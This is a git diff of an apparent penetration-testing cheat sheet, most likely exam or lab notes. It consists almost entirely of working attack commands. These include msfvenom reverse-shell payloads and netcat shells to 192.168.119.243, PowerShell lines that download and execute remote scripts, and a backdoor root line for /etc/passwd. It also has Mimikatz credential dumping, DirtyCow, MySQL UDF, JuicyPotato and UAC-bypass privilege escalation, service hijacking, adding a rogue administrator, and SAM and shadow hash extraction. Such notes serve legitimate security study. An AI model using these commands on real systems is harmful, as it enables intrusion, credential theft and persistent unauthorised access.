@@ -29,10 +29,10 @@ python3 -m http.server 80
 
 ## Curl request
 ```
-GET:
+#GET:
 curl -i -s -k -X $'GET' $'https://10.1.1.1/php-reverse-shell.php'
 
-POST:
+#POST:
 curl -i -s -k -X $'POST' --data-binary $'cmd=chmod%20%2Bs%20%2Fusr%2Fbin%2Fmysql&submit' $'http://10.1.1.1:8080/start_page.php?page=cmd.php'
 ```
 
@@ -155,13 +155,13 @@ Z:\nc64.exe -nv 192.168.119.243 443 -e cmd.exe
 ### Files
 Msfvenom
 ```
-Stageless
+#Stageless
 32bit:
 msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.243 LPORT=443 -f exe -o reverseshell32.exe
 64bit:
 msfvenom -a x64 --platform Windows -p windows/x64/shell_reverse_tcp LHOST=192.168.119.243 LPORT=443 -f exe -o reverseshell64.exe
 
-Staged
+#Staged
 32bit:
 msfvenom -p windows/shell/reverse_tcp LHOST=192.168.119.243 LPORT=443 -f exe -o reverseshell32.exe
 64bit:
@@ -177,21 +177,17 @@ locate webshell to list webshell
 common used: php-reverse-shell.php
 ```
 
-## Root user to add in /etc/passwd
-```
-root2:WVLY0mgH0RtUI:0:0:root:/root:/bin/bash        (root2:mrcake)
-```
-
 ## Powershell execute .ps1 file
 ```
 add command at end of .ps1 file, then
 powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -file powercat.ps1
 ```
 
-## Post exploitation
+## Exploitation
 Linux
 ```
 ./linpeas.sh
+sudo -l
 find / -perm -u=s -type f 2>/dev/null
 find / -mmin -10 2>/dev/null | grep -Ev "^/proc"
 find / -perm -2 -type f 2>/dev/null
@@ -207,6 +203,7 @@ winPEASx64.exe
 powershell -c "iex (new-object Net.WebClient).DownloadString('http://192.168.119.243:80/PowerUp.ps1');Invoke-AllChecks"
 net user
 net localgroup administrators
+netstat -ano
 icacls
 sc qc 
 schtasks /query /fo LIST
@@ -214,10 +211,10 @@ shutdown /r /t 0
 ```
 AD
 ```
-Direct execution:
+#Direct execution
 powershell -c "iex (new-object Net.WebClient).DownloadString("http://192.168.119.243:80/PowerView.ps1');Get-DomainUser -Properties DisplayName, MemberOf | Format-List"
 
-Import modules Powerview:
+#Import modules Powerview
 $env:PSModulePath -split ';'                  (modules path)
 Enter PS,
 Import-Module Recon
@@ -230,7 +227,7 @@ Get-DomainGroup -Identity 'Domain Admins'
 Get-DomainGroupMember -Identity 'Domain Admins' | Select-Object MemberDistinguishedName
 Get-NetUser -SPN
 
-Mimikatz:
+#Mimikatz
 privilege::debug
 token::elevate
 sekurlsa::logonpasswords
@@ -242,6 +239,95 @@ kerberos::list /dump
 klist
 ```
 
+## Exploit compiling
+Linux
+```
+gcc -static/-shared
+```
+Windows
+```
+i686-w64-mingw32-gcc -lws2_32             (32-bit)
+x86_64-w64-mingw32-gcc                    (64-bit)
+```
+
+## Docker to compile older Linux/gcc
+```
+docker pull gcc:4.6
+docker run --rm -v "$PWD":/usr/src/myapp -w /usr/src/myapp gcc:4.6 gcc -o lol lol.c
+```
+
+## Privilege escalation
+Linux
+```
+#GTFOBins
+mysql -u root -p -e '\! /bin/sh'
+
+#Root user to add in /etc/passwd
+root2:WVLY0mgH0RtUI:0:0:root:/root:/bin/bash        (root2:mrcake)
+
+#Dirtycow2
+https://www.exploit-db.com/exploits/40839
+gcc 40839.c -o 40839 -lcrypt -pthread
+
+#Mysql UDF2 PE
+gcc -g -c raptor_udf2.c
+gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
+mysql -u root -p
+use mysql;
+create table foo(line blob);
+insert into foo values(load_file('/tmp/raptor_udf2.so'));
+show variables like '%plugin%';
+select * from foo into dumpfile '/usr/lib/raptor_udf2.so';
+create function do_system returns integer soname 'raptor_udf2.so';
+select * from mysql.func;
+select do_system('bash -c "bash -i >& /dev/tcp/192.168.119.243/443 0>&1"');
+```
+Windows
+```
+#High mandatory level to SYSTEM
+PsExec64.exe -accepteula -i -s %SystemRoot%\system32\cmd.exe
+PsExec64.exe -i -accepteula -d -s C:\Users\nicky\AppData\Local\Temp\reverseshell64.exe
+
+#SeImpersonatePrivilege
+PrintSpoofer64.exe -i -c cmd.exe
+JuicyPotato64.exe -t * -p c:\windows\system32\cmd.exe -l 1338 -a "/c C:\Users\jill\AppData\Local\Temp\nc.exe 192.168.119.243 443 -e cmd.exe" 
+JuicyPotato64.exe -t * -p c:\windows\system32\cmd.exe -l 1338 -c {6d18ad12-bde3-4393-b311-099c346e6df9} -a "/c C:\Users\jill\AppData\Local\Temp\nc.exe 192.168.119.243 443 -e cmd.exe" 
+
+#BypassUAC
+https://ivanitlearning.wordpress.com/2019/07/07/bypassing-default-uac-settings-manually/
+REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "C:\Users\ted\AppData\Local\Temp\reverseshell64.exe" /f
+powershell Start-Process C:\Windows\System32\fodhelper.exe -WindowStyle Hidden
+
+#Service unquoted path 
+sc config usosvc binPath="C:\Windows\System32\spool\drivers\color\nc.exe 192.168.119.243 443 -e cmd.exe"
+sc qc usosvc
+shutdown /r /t 0
+
+#Add new user
+net user test 1234 /add
+net localgroup administrators test /add
+
+#Print proof
+type "C:\Documents and Settings\Administrator\Desktop\proof.txt"
+
+#Windows XP SP1 upnphost service
+https://guif.re/windowseop#EoP%201:%20Incorrect%20permissions%20in%20services
+```
+
+## Post exploitation 
+Linux 
+```
+/etc/shadow
+hashcat -m1800
+```
+Windows
+```
+reg save hklm\system system
+reg save hklm\sam sam
+
+samdump2 system sam -o sam.txt
+hashcat -m1000
+```
 
 
 
